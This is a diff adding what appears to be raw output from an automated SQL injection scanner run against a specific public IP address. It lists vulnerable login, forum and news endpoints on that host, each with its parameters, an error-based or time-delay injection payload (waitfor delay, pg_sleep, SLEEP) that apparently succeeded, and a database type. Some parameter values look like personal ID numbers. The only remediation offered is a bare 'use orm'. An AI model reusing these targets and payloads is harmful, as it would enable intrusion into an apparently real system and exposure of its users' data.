@@ -1,0 +1,130 @@
+Target: http://210.38.207.15/ (GET)
+
+---
+URL:http://210.38.207.15/checkusr.asp (POST)
+VulnName: sqli
+Query: {u'username': u'cntvalue', u'I1': u'\u767b \u9646', u'pwd': u'cntvalue', u'kind': u'A', u'B1': u'\u91cd \u7f6e'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '3', 'id': '644'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+---
+---
+URL:http://210.38.207.15/e.aspx (GET)
+VulnName: time delay sqli vuln
+Query: {'vid': '4'}
+Payload: );waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '654'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '653'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '652'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '14106016058'}
+Payload: ;waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '13113022012'}
+Payload: ' or pg_sleep(3) and '1'='1
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '651'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '195'}
+Payload: ');waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '14106011043'}
+Payload: " or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '123'}
+Payload: );waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/bbs/minfo.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'user': '\xd3\xce\xbf\xcd'}
+Payload: '));waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '188'}
+Payload: ));waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '194', 'Page': '2'}
+Payload: ));waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '193'}
+Payload: " or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+---
